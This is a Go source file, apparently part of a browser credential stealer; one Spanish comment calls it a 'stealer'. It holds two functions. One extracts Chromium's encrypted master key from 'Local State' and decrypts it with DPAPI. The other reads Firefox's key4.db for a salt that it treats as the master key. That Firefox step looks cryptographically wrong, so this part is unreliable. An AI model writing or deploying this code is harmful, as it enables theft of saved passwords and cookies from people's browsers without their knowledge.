package browsers

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"strings"
)

// GetMasterKey — extrae y desencripta la master key de un perfil Chromium
// path: directorio raíz del browser (donde está "Local State")
func (c *Chromium) GetMasterKey(path string) error {
	localStatePath := filepath.Join(path, "Local State")

	data, err := os.ReadFile(localStatePath)
	if err != nil {
		return err
	}

	var localState struct {
		OSCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}

	if err := json.Unmarshal(data, &localState); err != nil {
		return err
	}

	if localState.OSCrypt.EncryptedKey == "" {
		return errors.New("no encrypted key found")
	}

	encryptedKey, err := base64.StdEncoding.DecodeString(localState.OSCrypt.EncryptedKey)
	if err != nil {
		return err
	}

	// Los primeros 5 bytes son el prefijo "DPAPI"
	if len(encryptedKey) < 5 {
		return errors.New("encrypted key too short")
	}
	encryptedKey = encryptedKey[5:]

	masterKey, err := DPAPI(encryptedKey)
	if err != nil {
		return err
	}

	c.MasterKey = masterKey
	return nil
}

// GetMasterKey — extrae la master key de un perfil Gecko (Firefox)
// path: directorio del perfil Firefox (contiene key4.db / signons.sqlite)
func (g *Gecko) GetMasterKey(path string) error {
	// Gecko usa key4.db con una contraseña maestra vacía por defecto
	// La "master key" para Gecko es derivada del globalSalt en key4.db
	// Como simplificación para stealer sin dependencia extra NSS:
	// usamos el globalSalt del key4.db como master key
	dbPath := filepath.Join(path, "key4.db")
	if _, err := os.Stat(dbPath); err != nil {
		return errors.New("key4.db not found")
	}

	// Intentar leer globalSalt de key4.db via SQLite
	conn, err := GetDBConnection(dbPath)
	if err != nil {
		return err
	}
	defer conn.Close()

	var globalSaltHex string
	err = conn.QueryRow(
		"SELECT item_value FROM metadata WHERE item_name='global-salt'",
	).Scan(&globalSaltHex)
	if err != nil {
		// Intentar tabla alternativa
		err = conn.QueryRow(
			"SELECT a11 FROM nssPrivate LIMIT 1",
		).Scan(&globalSaltHex)
		if err != nil {
			return errors.New("no globalSalt found in key4.db")
		}
	}

	// El valor puede venir en formato hex o como blob
	hexStr := strings.TrimSpace(globalSaltHex)
	var saltBytes []byte
	if len(hexStr) > 0 {
		saltBytes = []byte(hexStr)
	}

	g.MasterKey = saltBytes
	return nil
}
